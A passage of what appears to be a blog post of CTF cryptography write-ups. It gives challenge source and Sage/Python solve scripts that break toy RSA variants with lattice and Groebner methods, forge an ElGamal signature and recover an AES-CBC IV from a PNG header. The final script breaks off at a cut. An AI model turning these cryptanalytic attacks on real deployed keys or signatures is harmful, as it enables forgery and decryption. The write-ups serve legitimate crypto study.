class="built_in">print</span>(p + b * q)</span><br><span class="line"><span class="built_in">print</span>(a * p + q)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 11850797596095451670524864488046085367812828367468720385501401042627802035427938560866042101544712923470757782908521283827297125349504897418356898752774318846698532487439368216818306352553082800908866174488983776084101115047054799618258909847935672497139557595959270012943240666681053544905262111921321629682394432293381001209674417203517322559283298774214341100975920287314509947562597521988516473281739331823626676843441511662000240327706777269733836703945274332346982187104319993337626265180132608256601473051048047584429295402047392826197446200263357260338332947498385907066370674323324146485465822881995994908925</span></span><br><span class="line"><span class="comment"># 21318014445451076173373282785176305352774631352746325570797607376133429388430074045541507180590869533728841479322829078527002230672051057531691634445544608584952008820389785877589775003311007782211153558201413379523215950193011250189319461422835303446888969202767656215090179505169679429932715040614611462819788222032915253996376941436179412296039698843901058781175173984980266474602529294294210502556931214075073722598225683528873417278644194278806584861250188304944748756498325965302770207316134309941501186831407953950259399116931502886169434888276069750811498361059787371599929532460624327554481179566565183721777</span></span><br><span class="line"><span class="comment"># 4780454330598494796755521994676122817049316484524449315904838558624282970709853419493322324981097593808974378840031638879097938241801612033487018497098140216369858849215655128326752931937595077084912993941304190099338282258345677248403566469008681644014648936628917169410836177868780315684341713654307395687505633335014603359767330561537038768638735748918661640474253502491969012573691915259958624247097465484616897537609020908205710563729989781151998857899164730749018285034659826333237729626543828084565456402192248651439973664388584573568717209037035304656129544659938260424175198672402598017357232325892636389317</span></span><br><span class="line"><span class="comment"># 9819969459625593669601382899520076842920503183309309803192703938113310555315820609668682700395783456748733586303741807720797250273398269491111457242928322099763695038354042594669354762377904219084248848357721789542296806917415858628166620939519882488036571575584114090978113723733730014540463867922496336721404035184980539976055043268531950537390688608145163366927155216880223837210005451630289274909202545128326823263729300705064272989684160839861214962848466991460734691634724996390718260697593087126527364129385260181297994656537605275019190025309958225118922301122440260517901900886521746387796688737094737637604</span></span><br></pre></td></tr></table></figure><p><a href="https://dexterjie.github.io/2024/11/04/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/">apbq</a><a href="https://github.com/defund/ctf/blob/master/angstromctf-2024/blahaj/solve.sage"></a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">c=<span class="number">11850797596095451670524864488046085367812828367468720385501401042627802035427938560866042101544712923470757782908521283827297125349504897418356898752774318846698532487439368216818306352553082800908866174488983776084101115047054799618258909847935672497139557595959270012943240666681053544905262111921321629682394432293381001209674417203517322559283298774214341100975920287314509947562597521988516473281739331823626676843441511662000240327706777269733836703945274332346982187104319993337626265180132608256601473051048047584429295402047392826197446200263357260338332947498385907066370674323324146485465822881995994908925</span></span><br><span class="line">n=<span class="number">21318014445451076173373282785176305352774631352746325570797607376133429388430074045541507180590869533728841479322829078527002230672051057531691634445544608584952008820389785877589775003311007782211153558201413379523215950193011250189319461422835303446888969202767656215090179505169679429932715040614611462819788222032915253996376941436179412296039698843901058781175173984980266474602529294294210502556931214075073722598225683528873417278644194278806584861250188304944748756498325965302770207316134309941501186831407953950259399116931502886169434888276069750811498361059787371599929532460624327554481179566565183721777</span></span><br><span class="line">y=<span class="number">4780454330598494796755521994676122817049316484524449315904838558624282970709853419493322324981097593808974378840031638879097938241801612033487018497098140216369858849215655128326752931937595077084912993941304190099338282258345677248403566469008681644014648936628917169410836177868780315684341713654307395687505633335014603359767330561537038768638735748918661640474253502491969012573691915259958624247097465484616897537609020908205710563729989781151998857899164730749018285034659826333237729626543828084565456402192248651439973664388584573568717209037035304656129544659938260424175198672402598017357232325892636389317</span></span><br><span class="line">x=<span class="number">9819969459625593669601382899520076842920503183309309803192703938113310555315820609668682700395783456748733586303741807720797250273398269491111457242928322099763695038354042594669354762377904219084248848357721789542296806917415858628166620939519882488036571575584114090978113723733730014540463867922496336721404035184980539976055043268531950537390688608145163366927155216880223837210005451630289274909202545128326823263729300705064272989684160839861214962848466991460734691634724996390718260697593087126527364129385260181297994656537605275019190025309958225118922301122440260517901900886521746387796688737094737637604</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">R = Integers(n)</span><br><span class="line"></span><br><span class="line">P.&lt;a, b, p, q&gt; = PolynomialRing(Integers(n))</span><br><span class="line"></span><br><span class="line">f1 = a*p + q</span><br><span class="line"></span><br><span class="line">f2 = p + b*q</span><br><span class="line"></span><br><span class="line">f3 = p*q</span><br><span class="line"></span><br><span class="line">I = Ideal([f1 - x, f2 - y, f3 - n])</span><br><span class="line">B = I.groebner_basis()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">g = B[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">z = ZZ(g.coefficient(&#123;q: <span class="number">1</span>&#125;))</span><br><span class="line"><span class="keyword">assert</span> g.constant_coefficient() == R(-y)</span><br><span class="line"></span><br><span class="line">_, (z1, _), (z2, _) = <span class="built_in">list</span>(g)</span><br><span class="line">z1 = ZZ(z1)</span><br><span class="line">z2 = ZZ(z2)</span><br><span class="line"></span><br><span class="line">S = <span class="number">2</span>^<span class="number">1024</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p_upper_bits <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    p_upper = p_upper_bits &lt;&lt; <span class="number">1020</span></span><br><span class="line">    <span class="keyword">for</span> q_upper_bits <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        q_upper = q_upper_bits &lt;&lt; <span class="number">1020</span></span><br><span class="line">        M = matrix(ZZ, [[S, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>], [S*z1, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>], [S*(z2 + p_upper + q_upper*z1), <span class="number">0</span>, <span class="number">0</span>, S], [S*n, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]])</span><br><span class="line">        B = M.LLL()</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> B:</span><br><span class="line">            <span class="keyword">if</span> b[-<span class="number">1</span>] == S:</span><br><span class="line">                <span class="keyword">if</span> b[<span class="number">1</span>] &lt; <span class="number">0</span>:</span><br><span class="line">                    b *= -<span class="number">1</span></span><br><span class="line">                p_guess = b[<span class="number">1</span>] + p_upper</span><br><span class="line">                q_guess = b[<span class="number">2</span>] + q_upper</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> p_guess * q_guess == n:</span><br><span class="line">                    d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, (p_guess - <span class="number">1</span>)*(q_guess - <span class="number">1</span>))</span><br><span class="line">                    message = long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(c, d, n)))</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> message:</span><br><span class="line">                        <span class="built_in">print</span>(message)</span><br><span class="line">                        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><a href="https://connor-mccartney.github.io/cryptography/rsa/BLAHAJ-angstrom-CTF-2024"></a></p><h3 id="alicessecret-pcb2024after-game"><a class="markdownIt-Anchor" href="#alicessecret-pcb2024after-game"></a> AlicesSecret-pcb2024(after game)</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> iv, KEY</span><br><span class="line"></span><br><span class="line"><span class="comment"># I think you will definitely be interested in the content in PNG!</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">banner</span>():</span><br><span class="line">    <span class="built_in">print</span>(</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">=======================================================================================</span></span><br><span class="line"><span class="string">     _      _   _                 _           ____                                _   </span></span><br><span class="line"><span class="string">    / \    | | (_)   ___    ___  ( )  ___    / ___|    ___    ___   _ __    ___  | |_ </span></span><br><span class="line"><span class="string">   / _ \   | | | |  / __|  / _ \ |/  / __|   \___ \   / _ \  / __| | &#x27;__|  / _ \ | __|</span></span><br><span class="line"><span class="string">  / ___ \  | | | | | (__  |  __/     \__ \    ___) | |  __/ | (__  | |    |  __/ | |_ </span></span><br><span class="line"><span class="string"> /_/   \_\ |_| |_|  \___|  \___|     |___/   |____/   \___|  \___| |_|     \___|  \__|</span></span><br><span class="line"><span class="string">                                                                                      </span></span><br><span class="line"><span class="string">=======================================================================================</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">return</span> m + (<span class="number">16</span> - (<span class="built_in">len</span>(m) % <span class="number">16</span>)) * <span class="string">b&quot;\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pngdata</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;picture.png&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        png_data = f.read()</span><br><span class="line">    <span class="keyword">return</span> pad(png_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_Key</span>(<span class="params">bits</span>):</span><br><span class="line">    p = getPrime(bits)</span><br><span class="line">    g = getPrime(bits // <span class="number">2</span>)</span><br><span class="line">    d = random.randint(<span class="number">1</span>, p - <span class="number">2</span>)</span><br><span class="line">    y = <span class="built_in">pow</span>(g, d, p)</span><br><span class="line">    public, private = (p, g, y), d</span><br><span class="line">    <span class="keyword">return</span> public, private</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Signature</span>(<span class="params">m, public, private</span>):</span><br><span class="line">    m = bytes_to_long(m)</span><br><span class="line">    p, g, _ = public</span><br><span class="line">    d = private</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        k = random.randint(<span class="number">1</span>, p - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> gmpy2.gcd(k, p - <span class="number">1</span>) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    r = <span class="built_in">pow</span>(g, k, p)</span><br><span class="line">    s = ((m - d * r) * inverse(k, p - <span class="number">1</span>)) % (p - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> (r, s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Verity</span>(<span class="params">m, sign, public</span>):</span><br><span class="line">    m = bytes_to_long(m)</span><br><span class="line">    p, g, y = public</span><br><span class="line">    r, s = sign</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">pow</span>(g, m, p) == (<span class="built_in">pow</span>(y, r, p) * <span class="built_in">pow</span>(r, s, p)) % p:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chall</span>():</span><br><span class="line">    banner()</span><br><span class="line"></span><br><span class="line">    pub, pri = get_Key(<span class="number">512</span>)</span><br><span class="line">    png_data = get_pngdata()</span><br><span class="line">    <span class="built_in">print</span>(</span><br><span class="line">        <span class="string">&quot;Hello! I&#x27;m Alice. To ensure that you are truly Bob, I need to verify your identity first!&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Can I help you sign once? Is there anything you need to sign?&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Here are your public key:<span class="subst">&#123;pub&#125;</span>&quot;</span>)</span><br><span class="line">    message = long_to_bytes(<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Give me what you need to sign:&quot;</span>)))</span><br><span class="line">    <span class="keyword">if</span> message == <span class="string">b&quot;Bob&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No, it&#x27;s not possible!!!&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Here are your sign:&quot;</span>)</span><br><span class="line">    r, s = Signature(message, pub, pri)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;r = <span class="subst">&#123;r&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;s = <span class="subst">&#123;s&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Tell me your signature so that I know you are truly Bob.&quot;</span>)</span><br><span class="line">    r = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;r = &quot;</span>))</span><br><span class="line">    s = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;s = &quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> Verity(<span class="string">b&quot;Bob&quot;</span>, (r, s), pub):</span><br><span class="line">        <span class="built_in">print</span>(</span><br><span class="line">            <span class="string">&quot;I have a great photo that I would like to share with you. Let&#x27;s send it to you in our old way! Hope you still keep our IV!&quot;</span></span><br><span class="line">        )</span><br><span class="line">        aes = AES.new(KEY, AES.MODE_CBC, iv)</span><br><span class="line">        enc_data = <span class="built_in">hex</span>(bytes_to_long(aes.encrypt(png_data)))[<span class="number">2</span>:]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Here is my encoded data:<span class="subst">&#123;enc_data&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Here is my key:<span class="subst">&#123;KEY.decode()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;In summary, I wish you a wonderful day!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Alright, you&#x27;re not Bob, I don&#x27;t have anything to chat with anymore.&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        chall()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>()<code>ElGamal</code></p><p>(<code>rs</code>)<br /><img src="https://pic1.zhimg.com/80/v2-adb3f6da452b31564230aea1107cc62c_1440w.png" alt="" /><br /><a href="https://ctf-wiki.org/crypto/signature/elgamal/#_15">https://ctf-wiki.org/crypto/signature/elgamal/#_15</a><br /><code>b'xxxx'</code><code>b'Bob</code><code>p-1</code><code>(p, g, y)</code><code>p</code></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>g</mi><mi>m</mi></msup><mo></mo><msup><mi>g</mi><mrow><mi>m</mi><mo>+</mo><mi>k</mi><mo></mo><mo stretchy="false">(</mo><mi>p</mi><mo></mo><mn>1</mn><mo stretchy="false">)</mo></mrow></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">g^{m}\equiv g^{m+k*(p-1)}(mod\ p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.858832em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.138em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mbin mtight">+</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight"></span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">p</span><span class="mbin mtight"></span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span><br /><code>message = long_to_bytes(bytes_to_long(b'Bob')+pub[0]-1)</code></p><p><code>AES</code><code>KEY</code><code>CBC mode</code><code>iv</code><br /><img src="https://picx.zhimg.com/80/v2-8d912081ccb73bea5ace1d9628057fa9_1440w.png" alt="" /><br /><img src="https://picx.zhimg.com/80/v2-02cb496288e7eaa8013f7d6963ec8c92_1440w.png" alt="" /><br /><code>png</code><code>0x89504e470d0a1a0a0000000d49484452</code><code>key</code><code>png</code><code>iv</code><br /><code>key</code><code>iv</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">pub = ()</span><br><span class="line">message = bytes_to_long(<span class="string">b&#x27;Bob&#x27;</span>)+pub[<span class="number">0</span>]-<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line"><span class="comment"># iv</span></span><br><span class="line">enc_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">key = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">head = <span class="number">0x89504e470d0a1a0a0000000d49484452</span></span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">data = bytes_to_long(aes.decrypt(<span class="built_in">bytes</span>.fromhex(enc_data)[:<span class="number">16</span>]))</span><br><span class="line">iv = long_to_bytes(data ^ head)</span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">png_data =aes.decrypt(<span class="built_in">bytes</span>.fromhex(enc_data))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;picture.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">    f.write(png_data)</span><br></pre></td></tr></table></figure><p></p><h3 id="tarssc-pcb2024"><a class="markdownIt-Anchor" href="#tarssc-pcb2024"></a> tarssc-pcb2024()</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">nbit  = <span class="number">1024</span></span><br><span class="line">beta  = <span class="number">0.30</span></span><br><span class="line">delta = <span class="number">0.10</span></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="built_in">int</span>(beta * nbit))</span><br><span class="line">q = getPrime(nbit - <span class="built_in">int</span>(beta * nbit))</span><br><span class="line"></span><br><span class="line">N = p * q</span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    dq = random.randrange(<span class="number">1</span>,<span class="built_in">int</span>(N ** delta))</span><br><span class="line">    <span class="keyword">if</span> dq &gt; q-<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    dp = random.randrange(<span class="number">1</span>,p-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        d = Integer(crt([dp%(p-<span class="number">1</span>),dq%(q-<span class="number">1</span>)],[p-<span class="number">1</span>,q-<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> GCD(d,phi) == <span class="number">1</span>:</span><br><span class="line">        e = <span class="built_in">int</span>(inverse(d,phi))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">seckey, pubkey = (p,q,d,dp,dq), (N,e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;N = <span class="subst">&#123;N&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag), e, N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">N = 61857467041120006957454494977971762866359211220721592255304580940306873708357617802596067329984189345493420858543581027612648626678588277060222860337783377316655375278359169520243355170247177279595812282793212550819124960549824278287538977769728573023023364686725321548391592858202718446127851076431000427033</span></span><br><span class="line"><span class="string">e = 22696852369762746127523066296087974245933137295782964284054040654103039210164173227291367914580709029582944005335464668969366909190396194570924426653294883884186299265660358589254391341147028477295482787041170991166896788171334992065199814524969470117229229967188623636764051681654720429531708441920158042161</span></span><br><span class="line"><span class="string">c = 41862679760722981662840433621129671566139143933210627878095169470855743742734397276638345217059912784871301273620533442249011607182329472311453700434692358352210197988000738272869600692181834281813995048665466937302183039555350612260646428575598237960405962714063137455677605629008760761743568236135324015278</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p><code>crtRSA</code><br />2021<code>crtrsa</code><br /><code>dq</code><code>dp</code><br /><code>dq</code><a href="https://www.cnblogs.com/vconlln/p/17066500.html">https://www.cnblogs.com/vconlln/p/17066500.html</a><br /><br /><a href="https://dds.sciengine.com/cfs/files/pdfs/1674-7267/6qxpd6SSmokuc5vLD-mark.pdf">https://dds.sciengine.com/cfs/files/pdfs/1674-7267/6qxpd6SSmokuc5vLD-mark.pdf</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> copy <span class="keyword">import</span> deepcopy</span><br><span class="line"><span class="comment"># https://www.iacr.org/archive/pkc2006/39580001/39580001.pdf</span></span><br><span class="line"><span class="comment"># Author: ZM__________J, To1in</span></span><br><span class="line">N = <span class="number">61857467041120006957454494977971762866359211220721592255304580940306873708357617802596067329984189345493420858543581027612648626678588277060222860337783377316655375278359169520243355170247177279595812282793212550819124960549824278287538977769728573023023364686725321548391592858202718446127851076431000427033</span></span><br><span class="line">e = <span class="number">22696852369762746127523066296087974245933137295782964284054040654103039210164173227291367914580709029582944005335464668969366909190396194570924426653294883884186299265660358589254391341147028477295482787041170991166896788171334992065199814524969470117229229967188623636764051681654720429531708441920158042161</span></span><br><span class="line">c = <span class="number">41862679760722981662840433621129671566139143933210627878095169470855743742734397276638345217059912784871301273620533442249011607182329472311453700434692358352210197988000738272869600692181834281813995048665466937302183039555350612260646428575598237960405962714063137455677605629008760761743568236135324015278</span></span><br><span class="line">alpha = log(e, N)</span><br><span class="line">beta = <span class="number">0.30</span></span><br><span class="line">delta = <span class="number">0.10</span></span><br><span class="line">P.&lt;x,y,z&gt;=PolynomialRing(ZZ)</span><br><span class="line"> </span><br><span class="line">X = ceil(<span class="number">2</span> * N^(alpha + beta + delta - <span class="number">1</span>))</span><br><span class="line">Y = ceil(<span class="number">2</span> * N^beta)</span><br><span class="line">Z = ceil(<span class="number">2</span> * N^(<span class="number">1</span> - beta))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="keyword">return</span> x*(N-y)+N</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trans</span>(<span class="params">f</span>):</span><br><span class="line">    my_tuples = f.exponents(as_ETuples=<span class="literal">False</span>)</span><br><span class="line">    g = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> my_tuple <span class="keyword">in</span> my_tuples:</span><br><span class="line">        exponent = <span class="built_in">list</span>(my_tuple)</span><br><span class="line">        mon = x ^ exponent[<span class="number">0</span>] * y ^ exponent[<span class="number">1</span>] * z ^ exponent[<span class="number">2</span>]</span><br><span class="line">        tmp = f.monomial_coefficient(mon)</span><br><span class="line">        </span><br><span class="line">        my_minus = <span class="built_in">min</span>(exponent[<span class="number">1</span>], exponent[<span class="number">2</span>])</span><br><span class="line">        exponent[<span class="number">1</span>] -= my_minus</span><br><span class="line">        exponent[<span class="number">2</span>] -= my_minus</span><br><span class="line">        tmp *= N^my_minus</span><br><span class="line">        tmp *= x ^ exponent[<span class="number">0</span>] * y ^ exponent[<span class="number">1</span>] * z ^ exponent[<span class="number">2</span>]</span><br><span class="line">        </span><br><span class="line">        g += tmp</span><br><span class="line">    <span class="keyword">return</span> g</span><br><span class="line">  </span><br><span class="line">m = <span class="number">5</span> <span class="comment"># need to be adjusted according to different situations</span></span><br><span class="line">tau = ((<span class="number">1</span> - beta)^<span class="number">2</span> - delta) / (<span class="number">2</span> * beta * (<span class="number">1</span> - beta))</span><br><span class="line">sigma = (<span class="number">1</span> - beta - delta) / (<span class="number">2</span> * (<span class="number">1</span> - beta))</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(sigma * m)</span><br><span class="line"><span class="built_in">print</span>(tau * m)</span><br><span class="line"> </span><br><span class="line">s = ceil(sigma * m)</span><br><span class="line">t = ceil(tau * m)</span><br><span class="line">my_polynomials = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m-i+<span class="number">1</span>):</span><br><span class="line">        g_ij = trans(e^(m-i) * x^j * z^s * f(x, y)^i)</span><br><span class="line">        my_polynomials.append(g_ij)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t+<span class="number">1</span>):</span><br><span class="line">        h_ij = trans(e^(m-i) * y^j * z^s * f(x, y)^i)</span><br><span class="line">        my_polynomials.append(h_ij)</span><br><span class="line">        </span><br><span class="line">known_set = <span class="built_in">set</span>()</span><br><span class="line">new_polynomials = []</span><br><span class="line">my_monomials = []</span><br><span class="line"> </span><br><span class="line"><span class="comment"># construct partial order</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(my_polynomials) &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(my_polynomials)):</span><br><span class="line">        f = my_polynomials[i]</span><br><span class="line">        current_monomial_set = <span class="built_in">set</span>(x^tx * y^ty * z^tz <span class="keyword">for</span> tx, ty, tz <span class="keyword">in</span> f.exponents(as_ETuples=<span class="literal">False</span>))</span><br><span class="line">        delta_set = current_monomial_set - known_set</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(delta_set) == <span class="number">1</span>:</span><br><span class="line">            new_monomial = <span class="built_in">list</span>(delta_set)[<span class="number">0</span>]</span><br><span class="line">            my_monomials.append(new_monomial)</span><br><span class="line">            known_set |= current_monomial_set</span><br><span class="line">            new_polynomials.append(f)            </span><br><span class="line">            my_polynomials.pop(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;GG&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">my_polynomials = deepcopy(new_polynomials)</span><br><span class="line"> </span><br><span class="line">nrows = <span class="built_in">len</span>(my_polynomials)</span><br><span class="line">ncols = <span class="built_in">len</span>(my_monomials)</span><br><span class="line">L = [[<span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ncols)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nrows)]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nrows):</span><br><span class="line">    g_scale = my_polynomials[i](X * x, Y * y, Z * z)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ncols):</span><br><span class="line">        L[i][j] = g_scale.monomial_coefficient(my_monomials[j])</span><br><span class="line">        